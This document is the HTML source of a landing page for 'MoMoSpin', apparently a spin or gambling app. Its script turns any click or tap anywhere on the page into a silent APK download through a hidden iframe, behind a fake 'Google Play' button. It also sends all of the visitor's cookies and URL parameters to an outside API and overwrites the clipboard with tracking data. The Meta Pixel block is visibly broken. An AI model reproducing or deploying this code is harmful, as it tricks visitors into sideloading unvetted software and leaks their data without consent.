<!doctype html>
<html lang="en" style="cursor: pointer">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"
    />
    <link rel="shortcut icon" href="/favicon.ico" />
    <title>MoMoSpin</title>
    <style>
      html,
      body {
        margin: 0;
        padding: 0;
        font-family: "Arial", sans-serif;
      }

      body {
        -webkit-font-smoothing: antialiased;
        background-color: black;
        display: flex;
        justify-content: center;
      }

      img {
        margin: 0;
        padding: 0;
      }

      .container {
        width: 100%;
        position: relative;
        max-width: 550px;
      }

      .container .BG {
        width: 100%;
        height: 100%;
        object-fit: cover;
      }

      .container .btn-container {
        position: absolute;
        left: 0%;
        top: 28%;
        display: flex;
        align-items: center;
        justify-content: center;
        width: 100%;
        gap: 20px;
      }

      .container .btn {
        width: 38%;
      }

      .footer {
        color: transparent;
        position: fixed;
        left: 50%;
        bottom: 0;
        transform: translateX(-50%);
        width: 100%;
        max-width: 550px;
        z-index: 999;
      }

      .footer img {
        width: 100%;
        height: auto;
        display: block;
      }
    </style>

    <!-- Meta Pixel Code -->
    <script>
      !(function (f, b, e, v, n, t, s) {
        if (f.fbq) return;
        n = f.fbq = function () {
          n.callMethod
            ? n.callMethod.apply(n, arguments)
            : n.queue.push(arguments);
        };
        if (!f._fbq) f._fbq = n;
        n.push = n;
        n.loaded = !0;
        n.version = "2.0";
        n.queue = [];
        t = b.createElement(e);
        t.async = !0;
        t.src = v;
        s = b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t, s);
      })(
        window,
        document,

        "https://connect.facebook.net/en_US/fbevents.js",
      );
      fbq("init", "1155945133346828");
      fbq("track", "PageView");

    <noscript>
      <img
        height="1"
        width="1"
        style="display: none"
        src="https://www.facebook.com/tr?id=1155945133346828&ev=PageView&noscript=1"
      />
    </noscript>
    <!-- End Meta Pixel Code -->
  </head>

  <body>
    <div class="container">
      <img class="BG" src="files/background.webp" alt="background" />
      <div class="btn-container">
        <img
          class="btn"
          onclick="goToTelegram(event)"
          src="files/telegram.webp"
          alt="Telegram"
        />
        <img class="btn" src="files/download.webp" alt="Google Play" />
      </div>
      <div class="footer">
        <img src="files/footer.webp" alt="footer" />
      </div>
    </div>
    <script src="files/Adjustscript.js"></script>
    <script>
      const urlParams = new URLSearchParams(window.location.search);
      const APK_NAME = "yayaebuz.bdap.1.0.apk";
      const APK_BASE = "https://downloads.momospin.com/";
      const API_BASE = "https://api.anubisriches.com/api/advertising";

      let link;

      function initLink() {
        const p0 = urlParams.get("ajtoken");
        const p1 = urlParams.get("p1");
        const p2 = urlParams.get("p2");
        const p3 = urlParams.get("p3");
        const p4 = urlParams.get("p4");
        const p5 = urlParams.get("p5");
        const p6 = urlParams.get("p6");
        const fbPid = getFbPid();
        const fbClickId = urlParams.get("fbclid");
        const url = buildURL(p0, p1, p2, p3, p4, p5, p6, fbClickId, fbPid);
        const apkUrl = APK_BASE + APK_NAME;

        link =
          url === "" ? apkUrl : url + "&redirect=" + encodeURIComponent(apkUrl);
      }
      initLink();

      function getUrl(url) {
        const cookieParams = document.cookie
          .replaceAll("; ", "&")
          .replaceAll(";", "&");
        const search = window.location.search;
        const separator = search.length ? "&" : "?";
        return url + search + separator + cookieParams;
      }

      function getCookie(name) {
        const value = "; " + document.cookie;
        const parts = value.split("; " + name + "=");
        if (parts.length === 2) return parts.pop().split(";").shift();
        return null;
      }

      function sendTrack(endpoint) {
        fetch(getUrl(API_BASE + endpoint)).catch(() => {});
      }

      window.onload = function () {
        sendTrack("/onshow");
      };
      // 全屏点击触发下载 + 复制（需要用户手势，剪贴板才能写入）
      document.addEventListener("click", onClickBtn, true);
      document.addEventListener("touchend", onClickBtn, true);

      let clicked = false;
      function onClickBtn() {
        if (clicked) return;
        clicked = true;
        setTimeout(() => (clicked = false), 1000);

        downloadApk();
        sendTrack("/ondownload");

        const leadId = urlParams.get("leadId") || "";
        const fbc = urlParams.get("fbclid") || "";
        const fbp = getCookie("_fbp") || "";
        const { origin, pathname } = window.location;

        const copyParam = {
          fbc,
          fbp,
          leadId,
          link: getUrl(origin + pathname),
        };

        navigator.clipboard
          .writeText(JSON.stringify(copyParam))
          .catch(() => {});
      }

      function downloadApk() {
        const iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.src = link;
        document.body.appendChild(iframe);
        setTimeout(() => document.body.removeChild(iframe), 1000);
      }

      function goToTelegram(e) {
        e.stopPropagation();
        window.open("https://t.me/momospin_game");
      }
    </script>
  </body>
</html>
